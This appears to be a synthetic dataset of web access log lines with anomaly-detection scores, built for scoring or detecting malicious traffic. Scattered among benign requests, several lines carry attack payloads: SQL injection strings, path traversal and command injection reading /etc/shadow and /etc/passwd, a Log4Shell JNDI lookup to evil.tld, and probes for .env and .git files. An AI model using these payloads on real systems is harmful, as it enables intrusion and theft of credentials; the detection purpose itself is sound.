score_content,score_session,score_fused,score_fused_norm,line
27.76958465576172,,27.76958465576172,27.76958465576172,146.173.34.73 - - [10/Jan/2025:12:27:05 +0000] "DELETE /logout HTTP/1.1" 200 257 "https://twitter.com/" "sqlmap/1.7.2#stable"
30115.0390625,,30115.0390625,30115.0390625,42.147.24.52 - - [10/Jan/2025:12:27:07 +0000] "POST /about HTTP/1.1" 401 1444 "-" "nikto/2.5.0"
73.52782440185547,,73.52782440185547,73.52782440185547,158.208.180.111 - - [10/Jan/2025:12:27:10 +0000] "OPTIONS /logout HTTP/1.1" 200 13396 "https://twitter.com/" "curl/7.85.0"
126.49809265136719,,126.49809265136719,126.49809265136719,32.176.72.212 - - [10/Jan/2025:12:27:11 +0000] "TRACE /search?q=headphones HTTP/1.1" 200 3156 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
30112.2734375,,30112.2734375,30112.2734375,170.113.217.94 - - [10/Jan/2025:12:27:14 +0000] "GET /login HTTP/1.1" 403 793 "https://www.google.com/" "curl/7.85.0"
2.187293767929077,,2.187293767929077,2.187293767929077,197.44.5.3 - - [10/Jan/2025:12:27:17 +0000] "GET / HTTP/1.1" 200 406 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
23.62440299987793,,23.62440299987793,23.62440299987793,240.22.54.176 - - [10/Jan/2025:12:27:17 +0000] "GET /api/product?id=123 HTTP/1.1" 200 18886 "https://news.ycombinator.com/" "python-requests/2.31.0"
26.52869987487793,,26.52869987487793,26.52869987487793,140.207.88.61 - - [10/Jan/2025:12:27:20 +0000] "POST /api/product?id=123 HTTP/1.1" 200 19964 "https://example.com/" "dirb/2.22"
73.47840881347656,,73.47840881347656,73.47840881347656,177.114.243.58 - - [10/Jan/2025:12:27:20 +0000] "OPTIONS /profile HTTP/1.1" 200 9712 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30183.626953125,,30183.626953125,30183.626953125,19.132.170.88 - - [10/Jan/2025:12:27:22 +0000] "OPTIONS /profile HTTP/1.1" 403 395 "https://twitter.com/" "python-requests/2.31.0"
27.808732986450195,,27.808732986450195,27.808732986450195,18.93.62.212 - - [10/Jan/2025:12:27:22 +0000] "DELETE /about HTTP/1.1" 200 10762 "-" "Wget/1.21.2 (linux-gnu)"
52.35777282714844,,52.35777282714844,52.35777282714844,217.220.155.165 - - [10/Jan/2025:12:27:24 +0000] "DELETE /search?q=phone HTTP/1.1" 301 8018 "https://example.com/" "curl/7.85.0"
11066.333984375,,11066.333984375,11066.333984375,215.99.127.52 - - [10/Jan/2025:12:27:24 +0000] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 502 745 "-" "sqlmap/1.7.2#stable"
13.48095703125,,13.48095703125,13.48095703125,94.115.134.171 - - [10/Jan/2025:12:27:27 +0000] "PUT /admin HTTP/1.1" 200 6896 "https://www.google.com/" "python-requests/2.31.0"
69.43243408203125,,69.43243408203125,69.43243408203125,89.237.48.16 - - [10/Jan/2025:12:27:27 +0000] "HEAD /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 945 "https://example.com/" "curl/7.85.0"
73.57486724853516,,73.57486724853516,73.57486724853516,149.160.32.178 - - [10/Jan/2025:12:27:28 +0000] "OPTIONS /admin HTTP/1.1" 200 16439 "https://www.google.com/" "curl/7.85.0"
95.10411834716797,,95.10411834716797,95.10411834716797,61.41.158.200 - - [10/Jan/2025:12:27:30 +0000] "OPTIONS /search?q=monitor HTTP/1.1" 200 900 "https://twitter.com/" "sqlmap/1.7.2#stable"
50.668235778808594,,50.668235778808594,50.668235778808594,187.206.65.103 - - [10/Jan/2025:12:27:30 +0000] "HEAD /dashboard HTTP/1.1" 302 17780 "https://example.com/" "dirb/2.22"
26.534563064575195,,26.534563064575195,26.534563064575195,94.80.225.83 - - [10/Jan/2025:12:27:30 +0000] "POST /search?q=phone HTTP/1.1" 200 18387 "https://news.ycombinator.com/" "dirb/2.22"
49.410743713378906,,49.410743713378906,49.410743713378906,173.68.116.25 - - [10/Jan/2025:12:27:33 +0000] "DELETE /search?q=router HTTP/1.1" 200 10895 "-" "sqlmap/1.7.2#stable"
7.743234634399414,,7.743234634399414,7.743234634399414,93.81.57.174 - - [10/Jan/2025:12:27:33 +0000] "POST /profile HTTP/1.1" 301 9849 "https://www.google.com/" "dirb/2.22"
3.2941324710845947,,3.2941324710845947,3.2941324710845947,192.99.67.3 - - [10/Jan/2025:12:27:34 +0000] "GET /index.html HTTP/1.1" 302 16722 "https://twitter.com/" "python-requests/2.31.0"
73.41364288330078,,73.41364288330078,73.41364288330078,61.179.47.135 - - [10/Jan/2025:12:27:36 +0000] "OPTIONS /dashboard HTTP/1.1" 200 9669 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
126.59400177001953,,126.59400177001953,126.59400177001953,224.141.132.127 - - [10/Jan/2025:12:27:36 +0000] "TRACE /search?q=router HTTP/1.1" 200 8808 "https://news.ycombinator.com/" "nikto/2.5.0"
30183.662109375,,30183.662109375,30183.662109375,21.81.170.182 - - [10/Jan/2025:12:27:39 +0000] "OPTIONS /about HTTP/1.1" 401 135 "-" "python-requests/2.31.0"
30110.705078125,,30110.705078125,30110.705078125,196.168.139.230 - - [10/Jan/2025:12:27:41 +0000] "GET /assets/app.css HTTP/1.1" 400 750 "https://www.google.com/" "nikto/2.5.0"
11044.7001953125,,11044.7001953125,11044.7001953125,246.4.166.7 - - [10/Jan/2025:12:27:44 +0000] "GET / HTTP/1.1" 503 192 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
73.57176971435547,,73.57176971435547,73.57176971435547,43.12.32.25 - - [10/Jan/2025:12:27:45 +0000] "OPTIONS /login HTTP/1.1" 200 15512 "https://example.com/" "sqlmap/1.7.2#stable"
73.58084106445312,,73.58084106445312,73.58084106445312,140.181.141.211 - - [10/Jan/2025:12:27:46 +0000] "OPTIONS /about HTTP/1.1" 200 18323 "https://news.ycombinator.com/" "python-requests/2.31.0"
49.345848083496094,,49.345848083496094,49.345848083496094,35.21.207.14 - - [10/Jan/2025:12:27:49 +0000] "DELETE /search?q=headphones HTTP/1.1" 200 11880 "https://example.com/" "curl/7.85.0"
35.22837829589844,,35.22837829589844,35.22837829589844,136.44.62.134 - - [10/Jan/2025:12:27:52 +0000] "PUT /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 204 11033 "https://twitter.com/" "curl/7.85.0"
49.371681213378906,,49.371681213378906,49.371681213378906,254.248.136.205 - - [10/Jan/2025:12:27:53 +0000] "DELETE /search?q=laptop HTTP/1.1" 200 988 "https://twitter.com/" "python-requests/2.31.0"
30180.39453125,,30180.39453125,30180.39453125,239.136.127.133 - - [10/Jan/2025:12:27:54 +0000] "HEAD /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 404 918 "https://example.com/" "python-requests/2.31.0"
35.11016845703125,,35.11016845703125,35.11016845703125,108.183.87.61 - - [10/Jan/2025:12:27:57 +0000] "PUT /api/product?id=123 HTTP/1.1" 200 11062 "https://news.ycombinator.com/" "python-requests/2.31.0"
4.82548189163208,,4.82548189163208,4.82548189163208,206.163.117.10 - - [10/Jan/2025:12:27:58 +0000] "GET /api/products HTTP/1.1" 304 240 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
69.50810241699219,,69.50810241699219,69.50810241699219,142.97.5.152 - - [10/Jan/2025:12:28:00 +0000] "HEAD /search?q=ssd HTTP/1.1" 204 14620 "https://news.ycombinator.com/" "nikto/2.5.0"
104.9240493774414,,104.9240493774414,104.9240493774414,196.214.252.141 - - [10/Jan/2025:12:28:02 +0000] "TRACE /profile HTTP/1.1" 200 12787 "-" "sqlmap/1.7.2#stable"
0.1440993994474411,,0.1440993994474411,0.1440993994474411,197.122.148.134 - - [10/Jan/2025:12:28:04 +0000] "GET /cgi-bin/test.cgi HTTP/1.1" 204 1328 "https://twitter.com/" "dirb/2.22"
1.8223659992218018,,1.8223659992218018,1.8223659992218018,145.221.177.95 - - [10/Jan/2025:12:28:06 +0000] "GET /dashboard HTTP/1.1" 200 929 "https://twitter.com/" "sqlmap/1.7.2#stable"
23.588533401489258,,23.588533401489258,23.588533401489258,176.240.3.100 - - [10/Jan/2025:12:28:07 +0000] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 686 "https://example.com/" "python-requests/2.31.0"
0.2508246600627899,,0.2508246600627899,0.2508246600627899,48.6.96.46 - - [10/Jan/2025:12:28:08 +0000] "GET /assets/app.js HTTP/1.1" 200 9592 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
13.432788848876953,,13.432788848876953,13.432788848876953,219.139.68.67 - - [10/Jan/2025:12:28:09 +0000] "PUT /contact HTTP/1.1" 200 12187 "https://twitter.com/" "python-requests/2.31.0"
30115.0625,,30115.0625,30115.0625,90.250.32.160 - - [10/Jan/2025:12:28:10 +0000] "POST /contact HTTP/1.1" 403 1486 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30205.748046875,,30205.748046875,30205.748046875,182.163.192.191 - - [10/Jan/2025:12:28:13 +0000] "OPTIONS /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 403 1117 "https://twitter.com/" "curl/7.85.0"
26.502294540405273,,26.502294540405273,26.502294540405273,229.114.48.118 - - [10/Jan/2025:12:28:15 +0000] "POST /search?q=phone HTTP/1.1" 200 9458 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
3.155240535736084,,3.155240535736084,3.155240535736084,213.58.244.42 - - [10/Jan/2025:12:28:16 +0000] "POST /wp-login.php HTTP/1.1" 200 573 "https://www.google.com/" "curl/7.85.0"
11090.0703125,,11090.0703125,11090.0703125,67.46.82.247 - - [10/Jan/2025:12:28:19 +0000] "HEAD /dashboard HTTP/1.1" 503 1417 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11046.9833984375,,11046.9833984375,11046.9833984375,1.213.7.30 - - [10/Jan/2025:12:28:19 +0000] "POST /api/products HTTP/1.1" 500 260 "https://twitter.com/" "dirb/2.22"
26.51538848876953,,26.51538848876953,26.51538848876953,29.244.248.119 - - [10/Jan/2025:12:28:19 +0000] "POST /search?q=ssd HTTP/1.1" 200 1997 "https://example.com/" "python-requests/2.31.0"
7.658294677734375,,7.658294677734375,7.658294677734375,14.103.67.235 - - [10/Jan/2025:12:28:22 +0000] "POST /dashboard HTTP/1.1" 301 5606 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
35.16307830810547,,35.16307830810547,35.16307830810547,196.64.22.135 - - [10/Jan/2025:12:28:22 +0000] "PUT /search?q=ssd HTTP/1.1" 200 9893 "https://twitter.com/" "sqlmap/1.7.2#stable"
126.6077880859375,,126.6077880859375,126.6077880859375,134.86.79.125 - - [10/Jan/2025:12:28:24 +0000] "TRACE /search?q=laptop HTTP/1.1" 200 12157 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
49.40217208862305,,49.40217208862305,49.40217208862305,94.35.96.24 - - [10/Jan/2025:12:28:25 +0000] "DELETE /search?q=phone HTTP/1.1" 200 4496 "https://news.ycombinator.com/" "curl/7.85.0"
5.172236919403076,,5.172236919403076,5.172236919403076,234.51.38.92 - - [10/Jan/2025:12:28:26 +0000] "GET / HTTP/1.1" 304 7504 "https://twitter.com/" "dirb/2.22"
2.179640054702759,,2.179640054702759,2.179640054702759,177.42.225.26 - - [10/Jan/2025:12:28:26 +0000] "GET / HTTP/1.1" 200 4824 "-" "sqlmap/1.7.2#stable"
30183.60546875,,30183.60546875,30183.60546875,156.61.16.146 - - [10/Jan/2025:12:28:27 +0000] "OPTIONS /api/products HTTP/1.1" 403 135 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
3.1378111839294434,,3.1378111839294434,3.1378111839294434,229.129.36.228 - - [10/Jan/2025:12:28:29 +0000] "GET /assets/app.css HTTP/1.1" 301 8159 "https://twitter.com/" "sqlmap/1.7.2#stable"
26.498302459716797,,26.498302459716797,26.498302459716797,212.101.46.134 - - [10/Jan/2025:12:28:30 +0000] "POST /search?q=camera HTTP/1.1" 200 13939 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
74.65448760986328,,74.65448760986328,74.65448760986328,13.245.154.145 - - [10/Jan/2025:12:28:33 +0000] "OPTIONS /cgi-bin/test.cgi HTTP/1.1" 301 2307 "https://www.google.com/" "sqlmap/1.7.2#stable"
3.1746416091918945,,3.1746416091918945,3.1746416091918945,1.24.46.38 - - [10/Jan/2025:12:28:35 +0000] "GET /assets/app.css HTTP/1.1" 302 12188 "https://example.com/" "nikto/2.5.0"
0.2798369526863098,,0.2798369526863098,0.2798369526863098,231.90.73.98 - - [10/Jan/2025:12:28:36 +0000] "GET /assets/app.js HTTP/1.1" 200 17518 "https://example.com/" "dirb/2.22"
26.483104705810547,,26.483104705810547,26.483104705810547,27.28.103.110 - - [10/Jan/2025:12:28:37 +0000] "GET /api/product?id=123 HTTP/1.1" 301 1575 "https://www.google.com/" "dirb/2.22"
126.6192626953125,,126.6192626953125,126.6192626953125,130.235.168.18 - - [10/Jan/2025:12:28:39 +0000] "TRACE /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 5486 "-" "sqlmap/1.7.2#stable"
49.437950134277344,,49.437950134277344,49.437950134277344,53.176.117.162 - - [10/Jan/2025:12:28:41 +0000] "DELETE /search?q=camera HTTP/1.1" 200 18696 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
1.9738483428955078,,1.9738483428955078,1.9738483428955078,85.32.24.110 - - [10/Jan/2025:12:28:44 +0000] "GET /logout HTTP/1.1" 200 14011 "https://news.ycombinator.com/" "curl/7.85.0"
7.8396453857421875,,7.8396453857421875,7.8396453857421875,162.200.186.94 - - [10/Jan/2025:12:28:46 +0000] "POST /login HTTP/1.1" 304 2454 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
47.800350189208984,,47.800350189208984,47.800350189208984,131.252.101.106 - - [10/Jan/2025:12:28:49 +0000] "HEAD /admin HTTP/1.1" 200 4779 "https://news.ycombinator.com/" "nikto/2.5.0"
3.200603723526001,,3.200603723526001,3.200603723526001,190.208.232.114 - - [10/Jan/2025:12:28:51 +0000] "GET /assets/app.js HTTP/1.1" 302 12875 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
4.759315013885498,,4.759315013885498,4.759315013885498,242.157.6.202 - - [10/Jan/2025:12:28:52 +0000] "POST /phpmyadmin HTTP/1.1" 200 18272 "-" "curl/7.85.0"
73.41667938232422,,73.41667938232422,73.41667938232422,44.213.230.167 - - [10/Jan/2025:12:28:54 +0000] "OPTIONS /api/products HTTP/1.1" 204 16504 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.9259037971496582,,1.9259037971496582,1.9259037971496582,172.48.99.105 - - [10/Jan/2025:12:28:56 +0000] "GET /logout HTTP/1.1" 200 751 "https://news.ycombinator.com/" "python-requests/2.31.0"
0.5204882025718689,,0.5204882025718689,0.5204882025718689,79.179.212.145 - - [10/Jan/2025:12:28:59 +0000] "GET /.env HTTP/1.1" 200 6127 "-" "curl/7.85.0"
95.1253662109375,,95.1253662109375,95.1253662109375,251.150.122.184 - - [10/Jan/2025:12:29:02 +0000] "OPTIONS /search?q=laptop HTTP/1.1" 200 3296 "-" "curl/7.85.0"
23.559165954589844,,23.559165954589844,23.559165954589844,222.120.156.112 - - [10/Jan/2025:12:29:03 +0000] "GET /search?q=router HTTP/1.1" 200 5370 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
104.95740509033203,,104.95740509033203,104.95740509033203,33.37.231.234 - - [10/Jan/2025:12:29:04 +0000] "TRACE /about HTTP/1.1" 200 4434 "https://www.google.com/" "python-requests/2.31.0"
73.47581481933594,,73.47581481933594,73.47581481933594,217.208.119.175 - - [10/Jan/2025:12:29:04 +0000] "OPTIONS /contact HTTP/1.1" 200 9117 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
35.17266845703125,,35.17266845703125,35.17266845703125,182.145.40.3 - - [10/Jan/2025:12:29:05 +0000] "PUT /search?q=ssd HTTP/1.1" 200 12279 "https://news.ycombinator.com/" "dirb/2.22"
72.4705581665039,,72.4705581665039,72.4705581665039,134.11.59.161 - - [10/Jan/2025:12:29:05 +0000] "HEAD /search?q=ssd HTTP/1.1" 302 13918 "https://news.ycombinator.com/" "nikto/2.5.0"
30.6192684173584,,30.6192684173584,30.6192684173584,207.246.203.39 - - [10/Jan/2025:12:29:08 +0000] "DELETE /api/products HTTP/1.1" 302 15219 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
95.16596221923828,,95.16596221923828,95.16596221923828,47.4.23.237 - - [10/Jan/2025:12:29:08 +0000] "OPTIONS /search?q=laptop HTTP/1.1" 200 12039 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
69.4847183227539,,69.4847183227539,69.4847183227539,74.111.83.242 - - [10/Jan/2025:12:29:08 +0000] "HEAD /search?q=ssd HTTP/1.1" 200 7486 "-" "Wget/1.21.2 (linux-gnu)"
23.61085319519043,,23.61085319519043,23.61085319519043,239.181.50.1 - - [10/Jan/2025:12:29:08 +0000] "GET /search?q=phone HTTP/1.1" 200 12094 "https://news.ycombinator.com/" "python-requests/2.31.0"
30134.38671875,,30134.38671875,30134.38671875,103.242.109.145 - - [10/Jan/2025:12:29:11 +0000] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 401 1293 "https://twitter.com/" "nikto/2.5.0"
3.231886863708496,,3.231886863708496,3.231886863708496,203.140.35.109 - - [10/Jan/2025:12:29:13 +0000] "GET /assets/app.css HTTP/1.1" 304 16963 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
0.2463645040988922,,0.2463645040988922,0.2463645040988922,247.232.150.69 - - [10/Jan/2025:12:29:16 +0000] "GET /assets/app.css HTTP/1.1" 200 14467 "https://example.com/" "sqlmap/1.7.2#stable"
4.7051472663879395,,4.7051472663879395,4.7051472663879395,222.103.42.79 - - [10/Jan/2025:12:29:19 +0000] "POST /api/products HTTP/1.1" 200 1089 "https://example.com/" "python-requests/2.31.0"
3.2644612789154053,,3.2644612789154053,3.2644612789154053,235.78.159.128 - - [10/Jan/2025:12:29:20 +0000] "GET /assets/app.js HTTP/1.1" 304 19977 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
103.31672668457031,,103.31672668457031,103.31672668457031,104.64.113.158 - - [10/Jan/2025:12:29:23 +0000] "TRACE /.git/config HTTP/1.1" 200 11267 "https://twitter.com/" "sqlmap/1.7.2#stable"
35.057125091552734,,35.057125091552734,35.057125091552734,24.132.120.119 - - [10/Jan/2025:12:29:24 +0000] "PUT /search?q=router HTTP/1.1" 200 2335 "https://twitter.com/" "sqlmap/1.7.2#stable"
0.19770760834217072,,0.19770760834217072,0.19770760834217072,196.35.48.254 - - [10/Jan/2025:12:29:27 +0000] "GET /../../etc/passwd HTTP/1.1" 201 13006 "https://www.google.com/" "dirb/2.22"
30.701133728027344,,30.701133728027344,30.701133728027344,57.112.231.252 - - [10/Jan/2025:12:29:29 +0000] "DELETE /profile HTTP/1.1" 302 14933 "https://news.ycombinator.com/" "curl/7.85.0"
38.11458206176758,,38.11458206176758,38.11458206176758,75.144.124.22 - - [10/Jan/2025:12:29:29 +0000] "PUT /api/user?id=1;DROP TABLE users HTTP/1.1" 304 14085 "https://news.ycombinator.com/" "curl/7.85.0"
13.478280067443848,,13.478280067443848,13.478280067443848,106.178.201.205 - - [10/Jan/2025:12:29:29 +0000] "PUT /login HTTP/1.1" 200 6365 "https://example.com/" "curl/7.85.0"
4.822030067443848,,4.822030067443848,4.822030067443848,36.254.182.156 - - [10/Jan/2025:12:29:30 +0000] "POST /contact HTTP/1.1" 200 9514 "https://news.ycombinator.com/" "nikto/2.5.0"
47.77500915527344,,47.77500915527344,47.77500915527344,18.82.85.177 - - [10/Jan/2025:12:29:31 +0000] "HEAD /logout HTTP/1.1" 200 6979 "https://twitter.com/" "sqlmap/1.7.2#stable"
27.7781925201416,,27.7781925201416,27.7781925201416,15.146.106.161 - - [10/Jan/2025:12:29:32 +0000] "DELETE /login HTTP/1.1" 204 5387 "https://example.com/" "curl/7.85.0"
6.091226100921631,,6.091226100921631,6.091226100921631,97.139.36.128 - - [10/Jan/2025:12:29:32 +0000] "POST /cgi-bin/test.cgi HTTP/1.1" 304 15579 "https://example.com/" "nikto/2.5.0"
1.971015214920044,,1.971015214920044,1.971015214920044,111.192.52.101 - - [10/Jan/2025:12:29:32 +0000] "GET /logout HTTP/1.1" 200 13233 "-" "python-requests/2.31.0"
49.360721588134766,,49.360721588134766,49.360721588134766,120.25.29.213 - - [10/Jan/2025:12:29:32 +0000] "DELETE /search?q=monitor HTTP/1.1" 200 4434 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
95.11762237548828,,95.11762237548828,95.11762237548828,236.188.227.29 - - [10/Jan/2025:12:29:33 +0000] "OPTIONS /search?q=monitor HTTP/1.1" 200 5596 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
47.750301361083984,,47.750301361083984,47.750301361083984,61.45.54.147 - - [10/Jan/2025:12:29:33 +0000] "HEAD /logout HTTP/1.1" 200 1813 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30.754310607910156,,30.754310607910156,30.754310607910156,217.102.33.71 - - [10/Jan/2025:12:29:33 +0000] "DELETE /login HTTP/1.1" 301 15365 "https://example.com/" "sqlmap/1.7.2#stable"
5.208761215209961,,5.208761215209961,5.208761215209961,45.224.185.247 - - [10/Jan/2025:12:29:36 +0000] "GET / HTTP/1.1" 304 16920 "https://example.com/" "python-requests/2.31.0"
23.603395462036133,,23.603395462036133,23.603395462036133,196.27.251.128 - - [10/Jan/2025:12:29:38 +0000] "GET /search?q=phone HTTP/1.1" 200 10234 "https://example.com/" "sqlmap/1.7.2#stable"
0.5434048175811768,,0.5434048175811768,0.5434048175811768,236.16.65.91 - - [10/Jan/2025:12:29:39 +0000] "GET /.env HTTP/1.1" 200 11230 "https://example.com/" "python-requests/2.31.0"
49.43316650390625,,49.43316650390625,49.43316650390625,24.38.7.173 - - [10/Jan/2025:12:29:42 +0000] "DELETE /search?q=camera HTTP/1.1" 200 17155 "https://twitter.com/" "python-requests/2.31.0"
